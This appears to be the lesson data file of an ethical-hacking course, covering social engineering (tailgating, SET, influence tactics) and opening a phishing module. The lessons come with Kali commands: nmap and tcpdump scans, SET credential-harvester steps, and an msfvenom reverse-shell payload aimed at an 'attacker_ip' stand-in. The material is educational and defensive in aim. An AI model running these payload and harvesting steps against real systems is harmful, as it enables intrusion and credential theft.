                <p class="text-gray-300">An attacker dressed as an IT technician enters an office building, connects a malicious USB to a workstation, and gains internal network access.</p>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Post-Physical Access',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Nmap</h4>
                  <p class="text-gray-300 mb-4">Used to scan internal networks after physical access is gained.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Discover live hosts on internal network</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -sn 192.168.1.0/24</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Scan open ports on a target system</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -p- 192.168.1.10</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Detect services and versions</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -sV 192.168.1.10</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Perform OS detection</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -O 192.168.1.10</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Run default NSE scripts</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -sC 192.168.1.10</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Wireshark</h4>
                  <p class="text-gray-300 mb-4">Used to capture and analyze network traffic once connected physically.</p>

                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch Wireshark</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Capture traffic on a specific interface</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark -i eth0</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Capture only HTTP traffic</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark -f "tcp port 80"</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Save captured packets</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark -w capture.pcap</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Analyze an existing capture file</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark capture.pcap</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Tailgating & Dumpster Diving',
        duration: '25 Minutes',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">What are Tailgating & Dumpster Diving?</h2>
          <p class="mb-4 text-gray-300">
            Tailgating and dumpster diving are physical social engineering techniques that exploit human behavior and poor disposal practices rather than technical vulnerabilities.
          </p>
          <div class="space-y-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Tailgating (Piggybacking)</h4>
              <p class="text-gray-300">An unauthorized person follows an authorized person into a restricted area without proper authentication (e.g., catching a door before it closes).</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Dumpster Diving</h4>
              <p class="text-gray-300">Searching through trash to find sensitive information such as passwords, organizational charts, source code, or personal data.</p>
            </div>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">How These Attacks Work</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Tailgating</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Exploits courtesy (e.g., holding the door for someone)</li>
                <li>Impersonating delivery personnel or repair technicians</li>
                <li>Joining a large group entering a building (crowd blending)</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Dumpster Diving</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Retrieving discarded hard drives, USBs, or sticky notes</li>
                <li>Collecting printed emails, invoices, or meeting notes</li>
                <li>Finding old employee ID badges or uniforms</li>
              </ul>
            </div>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Real-World Example</h3>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <p class="text-gray-300">
              A penetration tester waited near a smoking area outside a secure corporate building. When employees returned inside, the tester walked in with them, holding a coffee cup and pretending to be on a call. Once inside, they found a sticky note in a trash can with the Wi-Fi password and server admin credentials.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Forensics (Data Recovery from Discarded Media)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Foremost</h4>
                  <p class="text-gray-300 mb-4">A forensic tool used to recover lost or deleted files from flash drives and hard disks found during dumpster diving.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Recover files from an image</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">foremost -i image.dd -o output_folder</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Recover specific file types (e.g., jpg, pdf)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">foremost -t jpg,pdf -i image.dd</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Binwalk</h4>
                  <p class="text-gray-300 mb-4">A tool for analyzing and extracting firmware images and embedded files.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Scan a file for embedded data</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">binwalk firmware.bin</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Extract contents</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">binwalk -e firmware.bin</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Social Engineering Toolkits (SET)',
        duration: '30 Minutes',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Social Engineering Toolkits (SET)</h2>
          <p class="mb-4 text-gray-300">
            The Social Engineering Toolkit (SET) is a powerful, open‑source framework available in Kali Linux that is designed specifically for social engineering attack simulations. It is widely used by penetration testers and security teams to evaluate human vulnerabilities within an organization.
          </p>
          <p class="mb-4 text-gray-300">
            SET focuses on client‑side attacks rather than system exploits. It helps simulate real‑world scenarios such as credential harvesting, phishing attacks, fake login portals, and malicious payload delivery—strictly for authorized testing and awareness training.
          </p>
          <p class="mb-4 text-gray-300">
            SET automates complex attack setups, making it easier to demonstrate how attackers exploit trust and human behavior.
          </p>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Core Capabilities of SET</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Credential harvesting attacks</li>
              <li>Website cloning for impersonation</li>
              <li>Phishing email campaigns</li>
              <li>Payload generation</li>
              <li>Attack reporting and logging</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Why SET is Important in Security Testing</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Helps organizations train employees</li>
              <li>Demonstrates real attack impact safely</li>
              <li>Identifies weak security awareness</li>
              <li>Supports ethical hacking engagements</li>
            </ul>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Real‑world Example</h3>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <p class="text-gray-300">
              A company runs an internal awareness test using SET to simulate a fake HR login page and measures how many employees enter credentials.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Social Engineering',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Primary tool for creating and managing social engineering attack simulations.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Update SET framework</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit --update</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Start Social Engineering attack menu</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: 1) Social-Engineering Attacks</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Choose website attack vectors</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: 2) Website Attack Vectors</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch credential harvester attack</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: Credential Harvester Attack Method</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Metasploit Framework (Used with SET)</h4>
                  <p class="text-gray-300 mb-4">Used to generate and manage payloads delivered through SET campaigns.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch Metasploit</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">msfconsole</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">List available payloads</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">show payloads</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Generate a payload</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > payload.exe</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Start a listener</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">use exploit/multi/handler</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Set payload options</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">set payload windows/meterpreter/reverse_tcp</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Methods of Influence',
        duration: '20 Minutes',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Methods of Influence</h2>
          <p class="mb-4 text-gray-300">
            Methods of influence are psychological principles attackers use to persuade victims into taking actions they normally wouldn’t. These methods are not technical exploits—they exploit human decision-making shortcuts.
          </p>
          <p class="mb-4 text-gray-300">
            Attackers often combine multiple influence methods to increase success. Understanding these methods helps security professionals recognize, detect, and prevent social engineering attacks.
          </p>

          <div class="space-y-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Authority</h4>
              <p class="text-gray-300">People tend to obey individuals who appear to be in positions of power (managers, IT admins, police, auditors).</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Urgency</h4>
              <p class="text-gray-300">Creating pressure by claiming immediate action is required (“Your account will be locked in 10 minutes”).</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Fear</h4>
              <p class="text-gray-300">Threats of consequences such as account suspension, legal action, or data loss.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Scarcity</h4>
              <p class="text-gray-300">Claiming something is limited or time-bound (“Last chance to update credentials”).</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Social Proof</h4>
              <p class="text-gray-300">Implying others have already complied (“All employees have completed this step”).</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Reciprocity</h4>
              <p class="text-gray-300">Offering help or gifts to encourage compliance.</p>
            </div>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Real-world Example</h3>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <p class="text-gray-300">
              An attacker emails employees claiming to be the IT manager, stating that “all staff have already updated their passwords except you,” combining <span class="text-[#00bceb]">authority</span> + <span class="text-[#00bceb]">social proof</span> + <span class="text-[#00bceb]">urgency</span>.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Influence Simulation',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used to simulate influence-based attacks such as urgency, authority, and fear (authorized testing only).</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Start social engineering attack options</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: 1) Social-Engineering Attacks</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Choose website attack vectors</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: 2) Website Attack Vectors</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Clone a trusted website (authority & trust)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: Credential Harvester Attack Method</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Review captured credentials</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">cat /root/.set/reports/*</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Wireshark</h4>
                  <p class="text-gray-300 mb-4">Used to analyze how victims respond under influence during authorized awareness testing.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch Wireshark</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Capture traffic on a network interface</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark -i eth0</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Filter HTTP traffic (phishing responses)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tcp.port == 80</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Filter HTTPS handshakes</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tcp.port == 443</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Save captured traffic</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark -w influence_test.pcap</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Psychological Manipulation Techniques',
        duration: '25 Minutes',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Psychological Manipulation Techniques</h2>
          <p class="mb-4 text-gray-300">
            Psychological manipulation techniques are advanced social engineering methods that exploit how the human brain processes information, emotions, and stress. Attackers use these techniques to override rational thinking, causing victims to act impulsively.
          </p>
          <p class="mb-4 text-gray-300">
            Unlike basic influence methods, psychological manipulation focuses on cognitive biases and emotional control, often used in long-term or high-impact attacks.
          </p>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Cognitive Overload</h4>
              <p class="text-gray-300">Overwhelming the victim with too much information, causing confusion and mistakes.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Fear Conditioning</h4>
              <p class="text-gray-300">Repeatedly associating fear with consequences such as job loss or account suspension.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Authority Bias</h4>
              <p class="text-gray-300">Victims assume instructions are valid because they appear to come from superiors.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Consistency Trap</h4>
              <p class="text-gray-300">Victims comply because they already agreed to a small request earlier.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Trust Exploitation</h4>
              <p class="text-gray-300">Building rapport over time before exploiting the relationship.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Gaslighting</h4>
              <p class="text-gray-300">Making the victim doubt their own judgment or memory.</p>
            </div>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Real-world Example</h3>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <p class="text-gray-300">
              An attacker gradually builds trust with an employee over weeks, then convinces them that sharing credentials is a normal IT process during audits.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Behavioral Monitoring',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Wireshark</h4>
                  <p class="text-gray-300 mb-4">Used to observe behavioral patterns and communication flow during authorized manipulation simulations.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch Wireshark</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Capture packets on interface</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark -i eth0</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Filter HTTP traffic</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tcp.port == 80</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Filter DNS requests</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">dns</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Save captured packets</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">wireshark -w psych_manipulation.pcap</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">tcpdump</h4>
                  <p class="text-gray-300 mb-4">Lightweight command-line tool for traffic analysis and behavioral monitoring.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Capture all traffic on interface</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tcpdump -i eth0</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Capture only HTTP traffic</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tcpdump -i eth0 tcp port 80</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Capture traffic to a specific host</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tcpdump -i eth0 host target_ip</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Save capture to a file</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tcpdump -i eth0 -w capture.pcap</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Read an existing capture file</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tcpdump -r capture.pcap</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Summary & Real-World Examples',
        duration: '20 Minutes',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Summary & Real-World Examples</h2>
          <p class="mb-4 text-gray-300">
            Social engineering attacks remain one of the most successful cyber attack vectors because they exploit human trust instead of technical weaknesses. Throughout this module, we explored how attackers manipulate emotions, authority, routine behavior, and psychological biases to bypass security controls.
          </p>
          
          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Key Learnings from Module 5</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li>Humans are often the weakest link in security</li>
              <li>Social engineering can bypass strong technical defenses</li>
              <li>Attacks can be digital, verbal, or physical</li>
              <li>Awareness and verification processes are critical</li>
              <li>Most major breaches involve some form of social engineering</li>
            </ul>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Real-World Incidents</h3>
            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Twitter 2020 Breach</h4>
                <p class="text-gray-300 text-sm">Attackers used phone-based social engineering to impersonate IT staff and gained access to internal tools, compromising high-profile accounts.</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Target Data Breach</h4>
                <p class="text-gray-300 text-sm">Attackers gained network access using credentials obtained through social engineering of a third-party vendor.</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Google & Facebook Scam</h4>
                <p class="text-gray-300 text-sm">Employees were tricked into sending millions of dollars to attackers posing as legitimate suppliers.</p>
              </div>
            </div>
            <p class="mt-4 text-gray-300 italic">These cases show that technology alone cannot prevent attacks—human awareness and policy enforcement are equally important.</p>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Best Defensive Practices</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li>Mandatory security awareness training</li>
              <li>Strong identity verification procedures</li>
              <li>Least privilege access</li>
              <li>Clear incident reporting channels</li>
              <li>Regular social engineering simulations</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border-l-4 border-[#00bceb]">
            <h4 class="font-semibold text-white mb-1">Key Takeaway</h4>
            <p class="text-gray-300">Social engineering attacks succeed because people trust first and verify later. Building a security-aware culture is the strongest defense.</p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Reporting & Validation',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used to review, analyze, and clean up social engineering test results.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">View SET reports directory</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">ls -lah /root/.set/reports/</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Review captured credentials (authorized tests)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">cat /root/.set/reports/*</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Archive test reports</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">tar -czvf set_reports.tar.gz /root/.set/reports/</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Clean up SET data after testing</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">rm -rf /root/.set/*</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Nmap</h4>
                  <p class="text-gray-300 mb-4">Used to validate exposure after social engineering leads to network access.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Discover hosts on internal network</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -sn 192.168.1.0/24</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Scan common ports</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap 192.168.1.10</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Detect services and versions</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -sV 192.168.1.10</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Run default scripts</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -sC 192.168.1.10</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Save scan results</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -oN final_scan.txt 192.168.1.10</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      }
    ]
  },
  {
    id: 'module-6',
    title: 'Module 6: Everything About Phishing Attacks',
    duration: '1 week',
    description: 'Deep dive into various types of phishing attacks and how to defend against them.',
    lessons: [
      {
        title: 'What is Phishing?',
        duration: '20 Minutes',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">What is Phishing?</h2>
          <p class="mb-4 text-gray-300">
            Phishing is a social engineering attack where attackers deceive victims into revealing sensitive information such as usernames, passwords, OTPs, credit card details, or downloading malicious files. Phishing attacks typically impersonate <span class="text-[#00bceb]">trusted entities</span> like banks, companies, government bodies, or internal departments.
          </p>
          <p class="mb-4 text-gray-300">
            Phishing is dangerous because it combines <span class="text-[#00bceb]">psychological manipulation with technical delivery</span>, making it highly effective and scalable. Unlike direct hacking, phishing often requires only <span class="text-[#00bceb]">one mistake by the user</span>.
          </p>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">How phishing attacks work</h3>
            <ol class="list-decimal pl-5 space-y-2 text-gray-300">
              <li>Attacker impersonates a trusted source</li>
              <li>Victim receives a message (email, SMS, call, link)</li>
              <li>Victim clicks a malicious link or opens an attachment</li>
              <li>Credentials or data are captured, or malware is installed</li>
            </ol>
          </div>

          <div class="mb-6">
